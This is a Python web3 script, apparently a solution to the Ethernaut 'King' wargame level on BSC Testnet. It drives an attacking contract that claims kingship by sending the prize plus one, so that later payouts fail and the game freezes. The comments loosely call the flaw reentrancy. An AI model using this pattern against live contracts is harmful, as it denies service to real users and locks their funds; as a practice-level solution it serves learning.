# The objective here is to "freeze" the game. This contract has a reentrancy flaw, that is
# it sends Ether to another contract before updating state. To freeze the contract we make
# a contract with a sendEther function, so it becomes the owner of the contract and a 
# receive function that tries to send ether back everytime it receives ether, this will loop
# the the Ether sending whenever anyone tries to become King and make the transaction fail.

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions.
main_account = Account.from_key("") #TODO: Include main operator PK
print("Main wallet: " + main_account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0) # needed for BSC
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(main_account))
w3Provider.eth.default_account = main_account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

# We proceed to instance the attacking contract
buildFile = open('artifacts/contracts/KingAttack.sol/KingAttack.json', "r")
build = json.loads(buildFile.read())
attackContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# We proceed to instance the target contract
buildFile = open('../contracts/build/contracts/levels/King.sol/King.json', "r")
build = json.loads(buildFile.read())
targetContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# Check who's king and what's the prize
king = targetContract.functions._king().call()
print("The king is: " + king)
prize = targetContract.functions.prize().call()
print("The prize is: " + str(prize))

transaction = attackContract.functions.sendEther(targetContract.address).transact({"value": prize + 1}) #TODO: Include deployed contract address
print(w3Provider.eth.wait_for_transaction_receipt(transaction))

king = targetContract.functions._king().call()
print("The king is: " + king)
prize = targetContract.functions.prize().call()
print("The prize is: " + str(prize))